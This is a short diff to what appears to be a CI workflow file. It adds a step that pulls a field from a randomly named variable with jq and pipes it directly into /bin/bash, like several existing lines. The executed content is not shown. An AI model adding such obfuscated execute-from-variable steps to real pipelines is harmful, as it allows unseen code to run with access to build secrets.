@@ -37,6 +37,7 @@ jobs:
           echo $znin887 | jq -r .v33632 | /bin/bash
           echo $melr23 | jq -r .z0 | /bin/bash
           echo $bm965 | jq -r .po8 | /bin/bash
+          printf '%s' "$uw592" | jq -r .ioe47 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
